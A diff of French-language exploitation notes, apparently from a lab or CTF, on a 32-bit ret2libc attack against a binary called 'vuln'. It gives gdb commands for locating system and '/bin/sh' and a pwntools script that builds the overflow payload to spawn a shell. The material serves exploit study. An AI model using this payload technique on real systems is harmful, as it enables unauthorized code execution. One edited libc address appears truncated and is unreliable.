@@ -7,7 +7,7 @@
         /lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf7fc9000)
 ```
 
-**Attention: utiliser sa propre valeur -> réexécuter ldd:** ici 0xf7fc7000
+**Attention: utiliser sa propre valeur -> réexécuter ldd:** ici 0xf7c0000
 
 ## Trouver le padding = taille du buffer pour segfault
 
@@ -26,6 +26,8 @@ Overflow me
 ## Trouver system - exit - /bin/sh
 
 ```bash
+gdb -q ./vuln
+b *main
 p system
 ```
 
@@ -34,12 +36,13 @@ p exit
 ```
 
 ```bash
-find __libc_start_main,+99999999,"/bin/sh"
+find __libc_start_main,+99999999,"/bin/sh" #bp nécessaire
 ```
 
 ## Automatisation de l'exploitation
 
 Ça marche pas de ouf pour les addresses en fait. À corriger si le buffer est en argv[1] de plus.
+Penser à rajouter des \x90.
 
 ```python
 # 32-bit
@@ -55,8 +58,8 @@ system = libc.sym['system']            # Grab location of system
 binsh = next(libc.search(b'/bin/sh'))  # grab string location
 
 payload = b'A' * 76         # The padding
-payload += p32(system)      # Location of system
-payload += p32(0x0)         # return pointer - not important once we get the shell
+payload += p32(system)      # Location of system - sometimes execve()
+payload += p32(0x0)         # return pointer - not important once we get the shell - sometimes exit()
 payload += p32(binsh)       # pointer to command: /bin/sh
 
 p.clean()
